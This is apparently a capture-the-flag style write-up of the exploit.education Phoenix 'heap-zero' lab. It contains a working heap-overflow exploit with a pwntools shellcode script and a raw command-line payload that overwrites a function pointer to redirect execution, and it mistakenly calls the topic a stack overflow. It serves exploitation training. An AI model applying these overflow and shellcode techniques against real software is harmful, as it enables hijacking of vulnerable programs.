# Heap

There is multiple way of controlling the flow of a program, by overriding some part of the memory. In this section we will focus on stack memory overflow.

By example, you can override the content of the heap, to update the GOT.
To got further, you have to understand the structure on how malloc manage the heap allocation: https://sourceware.org/glibc/wiki/MallocInternals

For those examples, you will need to install Phoenix: https://exploit.education/phoenix/getting-started/

## Heap Zero

### Exercise

Description: https://exploit.education/phoenix/heap-zero/

### Solution

First we need to know where the function `winner` is implemented: `0x400abd`

```
$ gdb -batch -ex 'file /opt/phoenix/amd64/heap-zero' -ex 'disassemble winner'
Dump of assembler code for function winner:
   0x0000000000400abd <+0>:     push   %rbp
...
```

The function pointer gets overrided by `NNNNOOO`:
```
$ ./heap-zero AAAAAABBBBBBCCCCCCDDDDDDEEEEEEFFFFFFGGGGGGHHHHHHIIIIIIJJJJJJKKKKKKLLLLLLMMMMMMNNNNNNOOOOOOOO
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0x7ffff7ef5010, fp is at 0x7ffff7ef5060, will be calling 0x4f4f4f4f4e4e4e4e
Segmentation fault (core dumped)
```

> Sadly, the 64bit version of this challenge, is more complicated, as it contains null byte, preventing strcpy to proceed with our redirection.

To overcome this issue, we will inject a small binary shellcode, in our buffer, that jump to the correct address:

```asm
push 0x1010101 ^ 0x400abd
xor dword ptr [rsp], 0x1010101
ret
```

We need to override the pointer address to the begining of our data buffer, where our shellcode is injected:

```py3
# You need to install pwntools, to import pwnlib
import pwnlib
import struct

BUFFER = 0x7ffff7ef5010
WINNER = 0x400abd

pwnlib.context.arch = 'amd64'
shellcode = pwnlib.shellcraft.amd64.push(WINNER)
shellcode += pwnlib.shellcraft.amd64.ret()

shellcode = pwnlib.asm.asm(shellcode, arch='amd64')

buf = shellcode + b"." * (80 - len(shellcode))
buf += struct.pack("<Q", BUFFER)

print(buf)
```

We send the payload to our command line:
```
./heap-zero `echo -ne 'h\xbc\x0bA\x01\x814$\x01\x01\x01\x01\xc3................................................
...................\x10P\xef\xf7\xff\x7f\x00\x00'`
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0x7ffff7ef5010, fp is at 0x7ffff7ef5060, will be calling 0x7ffff7ef5010
Congratulations, you have passed this level
```
